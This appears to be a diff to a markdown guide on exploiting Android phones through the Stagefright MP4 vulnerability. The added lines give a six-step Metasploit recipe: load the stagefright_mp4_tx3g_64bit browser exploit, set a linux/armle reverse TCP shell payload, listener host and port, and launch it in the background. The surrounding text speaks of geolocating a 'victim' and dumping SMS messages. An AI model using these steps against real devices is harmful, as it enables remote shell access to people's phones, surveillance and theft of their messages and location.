@@ -53,6 +53,15 @@ However, it failed to execute.
 
 According to the Line 141 of JDuck's code, the handler must be configured with payload/linux/armle/shell_reverse_tcp. Thats originally how it designed to work.
 
+So...
+
+1. Use exploit/android/browser/stagefright_mp4_tx3g_64bit
+2. Set PAYLOAD linux/armle/shell_reverse_tcp
+3. Set LHOST 0.0.0.0
+4. Set LPORT to whatever you left your listener port to
+5. Set ExitOnSession false
+6. Exploit -j -z
+
 # Notes and Disclaimers
 
 1. Be forewarned that non-rooted devices were discovered to have limited capabilities, as described in OPERATION SMOKE JAGUAR. You cannot GEOLOCATE a victim or do a SMS dump without having the devices rooted first
